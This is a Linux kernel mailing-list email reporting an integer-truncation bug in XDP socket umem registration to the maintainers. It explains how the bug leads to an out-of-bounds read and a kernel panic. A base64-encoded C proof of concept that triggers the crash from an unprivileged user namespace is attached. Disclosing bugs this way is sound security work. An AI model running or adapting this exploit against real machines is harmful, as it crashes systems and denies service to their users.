Return-Path: <netdev-owner@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 051E81DB7E8
	for <lists+netdev@lfdr.de>; Wed, 20 May 2020 17:16:41 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1726829AbgETPQj (ORCPT <rfc822;lists+netdev@lfdr.de>);
        Wed, 20 May 2020 11:16:39 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:35364 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1726525AbgETPQj (ORCPT
        <rfc822;netdev@vger.kernel.org>); Wed, 20 May 2020 11:16:39 -0400
Received: from mail-il1-x143.google.com (mail-il1-x143.google.com [IPv6:2607:f8b0:4864:20::143])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 14C09C061A0E;
        Wed, 20 May 2020 08:16:38 -0700 (PDT)
Received: by mail-il1-x143.google.com with SMTP id y17so1259339ilg.0;
        Wed, 20 May 2020 08:16:38 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=+VhyhTdLrfwQbTY2b/JWDU5AASOjjMOxGId1SK5bZHI=;
        b=WeMsTi9f4je6YPdm5zzw5fNMDNyqJ055cADoqWoH861WU3kR/N+ew2wJ/DNAkn+KdR
         byc9+a0Cd5bK8Nru6sBgE3dFGn0mZnKFnMmHFgoeSC4Du18zm7sX29jks6TQ8XvtJvP2
         zLXJjSfxTdDMfLkBGxj/i3b5gUmPG+fBeCvIkvfkgvpIu4MVIZhnCfLXBYZvNaXmY9V8
         GaPO/UIobIINKzvfMASGAbrDiaavJbbLcKR1ddzbCTRG38ZnTlLyerTFvE/XQkfWzKgk
         DLfQpV4jzloUJBTAJGIqrwDLb+ya7gozHV/6XtbXVFF+eWhL6/N9T+VzVoaQ1n93eftn
         Ipdg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=+VhyhTdLrfwQbTY2b/JWDU5AASOjjMOxGId1SK5bZHI=;
        b=NzE2oobG1ui1x+3rWi/ZarX8d/Kf9V/L1dZQeCbXXOK9qUsd65x07lKu+YSyyYa9Da
         dVt8blrtggNaABecSNRzHwNfbn0lMJDBGLoshsEEMHLtctxmKSCHpJE2Sp+zKjwIL+oK
         /3t/213haFyy1YyJ60vfgxcH52z00NhNAVcAPVKjzHlPe89v1AkEj11fc5QYFfo191nY
         ENafAulTmmwRdqV71Un7pZyhLIcqAvUHSXtHsdxx16cQfuSsb/cdnI0ryqeS6Ws/K8LJ
         plRDCHNoxJNwv//b6xNbjlhC3dD4L10CU49AQlqWSS5ma/ZrCg+RpIJp2d4DGdoVC1Kb
         rr8A==
X-Gm-Message-State: AOAM531naqBCDE5FBMy9hxsLYTTz31Vidd0o4543aaaT0OMAvItOnLPF
        m7CKCk5mJaunsGkpad8BoualTyxLe45h3e8E7RBiGaf/XJ0=
X-Google-Smtp-Source: ABdhPJycAxj1JQdHF/8h/jZgz05TFzYE+x8ravcLtUDCxldaH6ND/dVs7FBow28JDokVOsZUxKu9HLDZIWaBnCV8Qjs=
X-Received: by 2002:a92:8dd2:: with SMTP id w79mr4419236ill.239.1589987797263;
 Wed, 20 May 2020 08:16:37 -0700 (PDT)
MIME-Version: 1.0
From:   =?UTF-8?Q?Minh_B=C3=B9i_Quang?= <minhquangbui99@gmail.com>
Date:   Wed, 20 May 2020 22:16:25 +0700
Message-ID: <CACtPs=GGvV-_Yj6rbpzTVnopgi5nhMoCcTkSkYrJHGQHJWFZMQ@mail.gmail.com>
Subject: XDP socket DOS bug
To:     Magnus Karlsson <magnus.karlsson@intel.com>, bjorn.topel@intel.com
Cc:     netdev@vger.kernel.org, bpf@vger.kernel.org
Content-Type: multipart/mixed; boundary="000000000000da8b8605a615e1e6"
Sender: netdev-owner@vger.kernel.org
Precedence: bulk
List-ID: <netdev.vger.kernel.org>
X-Mailing-List: netdev@vger.kernel.org

--000000000000da8b8605a615e1e6
Content-Type: text/plain; charset="UTF-8"

Dear sir,
In function xdp_umem_reg (net/xdp/xdp_umem.c), there is an initialization
         //size is u64
         umem->npgs = size / PAGE_SIZE;
When look at the definition of xdp_umem struct, I see
        struct xdp_umem {
                 .....
                 u32 npgs;
                 .....
        }
npgs is u32, however the result of division can be bigger than u32
(there is no limit in size which is u64), so the result can be
truncated when assigned to npgs. For example, size is 0x1 000 0000
8000, result of division is 0x1 0000 0008, and the npgs is truncated
to 0x8.
======
In the process of analyzing the consequence of this bug, I found that
only npgs pages get mapped and the size is used to initialize
queue->size. queue->size is used to validate the address provided in
user-supplied xdp_desc in tx path (xdp_generic_xmit). In
xdp_generic_xmit the address provided passed the size check and reach
xdp_umem_get_data. That address is then used as and index to
umem->pages to get real virtual address. This leads to an out of bound
read in umem->pages and if the attacker spray some addresses, he can
use this bug to get arbitrary read.
However, I cannot see any ways to intercept the xdp packet because
that packet is sent to bpf program by design. Therefore, I cannot get
info leak using this bug but I can craft a poc to get kernel panic on
normal user as long as CONFIG_USER_NS=y.

Regards,
Bui Quang Minh

--000000000000da8b8605a615e1e6
Content-Type: application/octet-stream; name="poc.c"
Content-Disposition: attachment; filename="poc.c"
Content-Transfer-Encoding: base64
Content-ID: <f_kafhhaf90>
X-Attachment-Id: f_kafhhaf90

I2RlZmluZSBfR05VX1NPVVJDRQ0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN5cy90
eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNs
dWRlIDxzY2hlZC5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNp
bmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8c3Ry
aW5nLmg+DQojaW5jbHVkZSA8c3RkaW50Lmg+DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCiNpbmNs
dWRlIDxuZXQvaWYuaD4NCiNpbmNsdWRlIDxsaW51eC9icGYuaD4NCiNpbmNsdWRlIDx1bmlzdGQu
aD4NCiNpbmNsdWRlIDxsaW51eC9pZl94ZHAuaD4NCiNpbmNsdWRlIDxsaW51eC9pZl9wYWNrZXQu
aD4NCiNpbmNsdWRlIDxuZXQvZXRoZXJuZXQuaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCiNp
bmNsdWRlIDxsaW51eC9ydG5ldGxpbmsuaD4NCiNpbmNsdWRlIDxzeXMvcmVzb3VyY2UuaD4NCiNp
bmNsdWRlIDxsaW51eC9pZl9wYWNrZXQuaD4NCg0KI2RlZmluZSBlcnJfZXhpdChtc2cpIGRvIHsg
cGVycm9yKG1zZyk7IGV4aXQoRVhJVF9GQUlMVVJFKTsgfSB3aGlsZSgwKQ0KdHlwZWRlZiB1aW50
NjRfdCB1NjQ7DQp0eXBlZGVmIHVpbnQzMl90IHUzMjsNCnR5cGVkZWYgdWludDE2X3QgdTE2Ow0K
I2RlZmluZSBYRFBfVU1FTV9VTkFMSUdORURfQ0hVTktfRkxBRyAoMSA8PCAwKQ0KI2RlZmluZSBQ
Rl9YRFAgNDQNCiNkZWZpbmUgU09MX1hEUAkyODMNCiNkZWZpbmUgWERQX1VNRU1fUkVHIDQNCiNk
ZWZpbmUgWERQX1JYX1JJTkcgMg0KI2RlZmluZSBYRFBfVFhfUklORyAzDQojZGVmaW5lIFhEUF9V
TUVNX0ZJTExfUklORyA1DQojZGVmaW5lIFhEUF9VTUVNX0NPTVBMRVRJT05fUklORyA2DQojZGVm
aW5lIFhEUF9VU0VfTkVFRF9XQUtFVVAgKDEgPDwgMykNCiNkZWZpbmUgWERQX01NQVBfT0ZGU0VU
UyAxDQoNCnZvaWQqIHVtZW07DQp2b2lkKiBjcjsNCnZvaWQqIHR4Ow0KDQpzdHJ1Y3QgbXlfeGRw
X3VtZW1fcmVnIHsNCgl1NjQgYWRkcjsgLyogU3RhcnQgb2YgcGFja2V0IGRhdGEgYXJlYSAqLw0K
CXU2NCBsZW47IC8qIExlbmd0aCBvZiBwYWNrZXQgZGF0YSBhcmVhICovDQoJdTMyIGNodW5rX3Np
emU7DQoJdTMyIGhlYWRyb29tOw0KCXUzMiBmbGFnczsNCn07DQoNCiNkZWZpbmUgQlVGX1NJWkUg
MTAyNA0KY2hhciBsb2dfYnVmW0JVRl9TSVpFXTsNCg0Kdm9pZCB3cml0ZV9maWxlKGNoYXIqIGZp
bGVfbmFtZSwgY2hhciogZGF0YSkNCnsNCglpbnQgZiA9IG9wZW4oZmlsZV9uYW1lLCBPX1dST05M
WSk7DQoJaWYgKGYgPCAwKQ0KCQllcnJfZXhpdCgib3BlbiIpOw0KCWludCByZXN1bHQgPSB3cml0
ZShmLCBkYXRhLCBzdHJsZW4oZGF0YSkpOw0KCWlmIChyZXN1bHQgPCBzdHJsZW4oZGF0YSkpDQoJ
CWVycl9leGl0KCJ3cml0ZSIpOw0KCWNsb3NlKGYpOw0KfQ0KDQp2b2lkIHNldHVwX3NhbmRib3go
KQ0Kew0KCWludCByZXN1bHQ7DQoJY2hhciBidWZbMTAyNF07DQoJdWlkX3QgdWlkID0gZ2V0dWlk
KCk7DQoJdWlkX3QgZ2lkID0gZ2V0Z2lkKCk7DQoJcmVzdWx0ID0gdW5zaGFyZShDTE9ORV9ORVdV
U0VSKTsNCglpZiAocmVzdWx0IDwgMCkNCgkJZXJyX2V4aXQoInVuc2hhcmUtQ0xPTkUtTkVXVVNF
UiIpOw0KCXJlc3VsdCA9IHVuc2hhcmUoQ0xPTkVfTkVXTkVUKTsNCglpZiAocmVzdWx0IDwgMCkN
CgkJZXJyX2V4aXQoInVuc2hhcmUtQ0xPTkUtTkVXTkVUIik7DQoNCgkvLyBzZXQgbWFwcGluZyBm
cm9tIHVpZChnaWQpIGluc2lkZSB0aGUgbmFtZXNwYWNlIHRvIHRoZSBvdXRzaWRlDQoJd3JpdGVf
ZmlsZSgiL3Byb2Mvc2VsZi9zZXRncm91cHMiLCAiZGVueSIpOw0KDQoJc3ByaW50ZihidWYsICIw
ICVkIDFcbiIsIHVpZCk7DQoJd3JpdGVfZmlsZSgiL3Byb2Mvc2VsZi91aWRfbWFwIiwgYnVmKTsN
Cg0KCXNwcmludGYoYnVmLCAiMCAlZCAxXG4iLCBnaWQpOw0KCXdyaXRlX2ZpbGUoIi9wcm9jL3Nl
bGYvZ2lkX21hcCIsIGJ1Zik7DQoNCgljcHVfc2V0X3QgbXlfc2V0Ow0KCUNQVV9aRVJPKCZteV9z
ZXQpOw0KCUNQVV9TRVQoMCwgJm15X3NldCk7DQoJaWYgKHNjaGVkX3NldGFmZmluaXR5KDAsIHNp
emVvZihteV9zZXQpLCAmbXlfc2V0KSAhPSAwKSB7DQoJCWVycl9leGl0KCJzY2hlZC1zZXRhZmZp
bml0eSIpOw0KCX0NCg0KCXJlc3VsdCA9IHN5c3RlbSgiL3NiaW4vaWZjb25maWcgbG8gdXAiKTsN
CglpZiAocmVzdWx0IDwgMCkNCgkJZXJyX2V4aXQoImlmY29uZmlnIik7DQp9DQoNCmludCBzZXR1
cF9zb2NrZXQoKQ0Kew0KCWludCBmZCA9IHNvY2tldChQRl9YRFAsIFNPQ0tfUkFXLCAwKTsNCglp
ZiAoZmQgPCAwKQ0KCQllcnJfZXhpdCgic29ja2V0LWNyZWF0ZSIpOw0KDQoJdW1lbSA9IG1tYXAo
MCwgMHg4MDAwLCBQUk9UX1JFQUR8UFJPVF9XUklURSwgTUFQX1BSSVZBVEV8TUFQX0FOT05ZTU9V
UywgMCwgMCk7DQoJaWYgKHVtZW0gPCAwKQ0KCQllcnJfZXhpdCgibW1hcCIpOw0KDQoJbWVtc2V0
KHVtZW0gKyAweDcwMDAsIDB4NDEsIDB4MTAwMCAtIDEpOw0KCXN0cnVjdCBteV94ZHBfdW1lbV9y
ZWcgbXI7DQoJbWVtc2V0KCZtciwgMCwgc2l6ZW9mIG1yKTsNCgltci5hZGRyID0gKHU2NCkgdW1l
bTsNCgltci5sZW4gPSAweDEwMDAwMDAwODAwMDsNCgltci5jaHVua19zaXplID0gMHgxMDAwOw0K
CW1yLmhlYWRyb29tID0gMDsNCgltci5mbGFncyA9IDA7DQoNCglpbnQgcmVzdWx0ID0gc2V0c29j
a29wdChmZCwgU09MX1hEUCwgWERQX1VNRU1fUkVHLCAmbXIsIHNpemVvZiBtcik7DQoJaWYgKHJl
c3VsdCA8IDApDQoJCWVycl9leGl0KCJzZXRzb2Nrb3B0LXVtZW0tcmVnIik7DQoNCglpbnQgZW50
cmllcyA9IDQ7DQoJcmVzdWx0ID0gc2V0c29ja29wdChmZCwgU09MX1hEUCwgWERQX1JYX1JJTkcs
ICZlbnRyaWVzLCBzaXplb2YgZW50cmllcyk7DQoJaWYgKHJlc3VsdCA8IDApDQoJCWVycl9leGl0
KCJzZXRzb2Nrb3B0LXJ4LXJpbmciKTsNCg0KCXJlc3VsdCA9IHNldHNvY2tvcHQoZmQsIFNPTF9Y
RFAsIFhEUF9UWF9SSU5HLCAmZW50cmllcywgc2l6ZW9mIGVudHJpZXMpOw0KCWlmIChyZXN1bHQg
PCAwKQ0KCQllcnJfZXhpdCgic2V0c29ja29wdC10eC1yaW5nIik7DQoNCglyZXN1bHQgPSBzZXRz
b2Nrb3B0KGZkLCBTT0xfWERQLCBYRFBfVU1FTV9GSUxMX1JJTkcsICZlbnRyaWVzLCBzaXplb2Yg
ZW50cmllcyk7DQoJaWYgKHJlc3VsdCA8IDApDQoJCWVycl9leGl0KCJzZXRzb2Nrb3B0LWZpbGwt
cmluZyIpOw0KDQoJcmVzdWx0ID0gc2V0c29ja29wdChmZCwgU09MX1hEUCwgWERQX1VNRU1fQ09N
UExFVElPTl9SSU5HLCAmZW50cmllcywgc2l6ZW9mIGVudHJpZXMpOw0KCWlmIChyZXN1bHQgPCAw
KQ0KCQllcnJfZXhpdCgic2V0c29ja29wdC1jb21wbGV0aW9uLXJpbmciKTsNCg0KCXN0cnVjdCB4
ZHBfbW1hcF9vZmZzZXRzIG9mZjsNCglpbnQgbGVuID0gc2l6ZW9mIG9mZjsNCglyZXN1bHQgPSBn
ZXRzb2Nrb3B0KGZkLCBTT0xfWERQLCBYRFBfTU1BUF9PRkZTRVRTLCAmb2ZmLCAmbGVuKTsNCglp
ZiAocmVzdWx0IDwgMCkNCgkJZXJyX2V4aXQoImdldHNvY2tvcHQiKTsNCg0KCXR4ID0gbW1hcCgw
LCBvZmYudHguZGVzYyArDQoJCQkJCTQgKiBzaXplb2Yoc3RydWN0IHhkcF9kZXNjKSwNCgkJCQkJ
UFJPVF9SRUFEIHwgUFJPVF9XUklURSwgTUFQX1NIQVJFRCB8IE1BUF9QT1BVTEFURSwNCgkJCQkJ
ZmQsIFhEUF9QR09GRl9UWF9SSU5HKTsNCglpZiAodHggPCAwKQ0KCQllcnJfZXhpdCgibW1hcC10
eC1yaW5nIik7DQoNCgljciA9IG1tYXAoMCwgb2ZmLmNyLmRlc2MgKw0KCQkJCQk0ICogc2l6ZW9m
KHU2NCksDQoJCQkJCVBST1RfUkVBRCB8IFBST1RfV1JJVEUsIE1BUF9TSEFSRUQgfCBNQVBfUE9Q
VUxBVEUsDQoJCQkJCWZkLCBYRFBfVU1FTV9QR09GRl9DT01QTEVUSU9OX1JJTkcpOw0KCWlmIChj
ciA8IDApDQoJCWVycl9leGl0KCJtbWFwLWNvbXBsZXRpb24tcmluZyIpOw0KDQoJc3RydWN0IHNv
Y2thZGRyX3hkcCBhZGRyOw0KCW1lbXNldCgmYWRkciwgMCwgc2l6ZW9mIGFkZHIpOw0KCWFkZHIu
c3hkcF9mYW1pbHkgPSBQRl9YRFA7DQoJYWRkci5zeGRwX2lmaW5kZXggPSBpZl9uYW1ldG9pbmRl
eCgibG8iKTsNCglhZGRyLnN4ZHBfcXVldWVfaWQgPSAwOw0KCWFkZHIuc3hkcF9mbGFncyA9IFhE
UF9VU0VfTkVFRF9XQUtFVVA7DQoJcmVzdWx0ID0gYmluZChmZCwgKHN0cnVjdCBzb2NrYWRkciAq
KSAmYWRkciwgc2l6ZW9mIGFkZHIpOw0KCWlmIChyZXN1bHQgPCAwKQ0KCQllcnJfZXhpdCgiYmlu
ZCIpOw0KDQoJc3RydWN0IHhkcF9kZXNjKiB0eF9kZXNjID0gKHN0cnVjdCB4ZHBfZGVzYyopICh0
eCArIG9mZi50eC5kZXNjKTsNCgl0eF9kZXNjLT5hZGRyID0gMHg5MDAwOw0KCXR4X2Rlc2MtPmxl
biA9IDB4MTAwMCAtIDE7DQoJdHhfZGVzYy0+b3B0aW9ucyA9IDA7DQoNCgl1MzIqIHR4X3Byb2R1
Y2VyID0gdHggKyBvZmYudHgucHJvZHVjZXI7DQoJdHhfcHJvZHVjZXJbMF0gPSAxOw0KDQoJaW50
IHJldCA9IHNlbmR0byhmZCwgTlVMTCwgMCwgTVNHX0RPTlRXQUlULCBOVUxMLCAwKTsNCglpZiAo
cmV0IDwgMCkNCgkJZXJyX2V4aXQoInNlbmR0byIpOw0KCXJldHVybiBmZDsNCn0NCg0KaW50IG1h
aW4oKQ0Kew0KCXNldHVwX3NhbmRib3goKTsNCglwdXRzKCJTZXR0aW5nIHVwIHNvY2tldCIpOw0K
CWludCBmZCA9IHNldHVwX3NvY2tldCgpOw0KCXBhY2tldF9yZWN2KCk7DQoJcmV0dXJuIDA7DQp9
--000000000000da8b8605a615e1e6--
